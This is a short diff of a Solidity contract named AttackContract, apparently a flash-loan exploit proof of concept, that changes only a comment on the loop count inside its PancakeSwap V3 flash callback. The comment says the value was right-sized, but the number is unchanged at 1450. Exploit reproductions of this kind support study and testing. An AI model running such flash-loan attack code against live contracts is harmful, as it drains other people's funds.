@@ -67,7 +67,7 @@ contract AttackContract {
     }
 
     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
-        uint256 times = 1450; // 1450
+        uint256 times = 1450; // was 1450; right-sized for playground // 1450
         for (uint256 i = 0; i < times; i++) {
             address[] memory path = new address[](2);
             path[0] = BSC_USD;
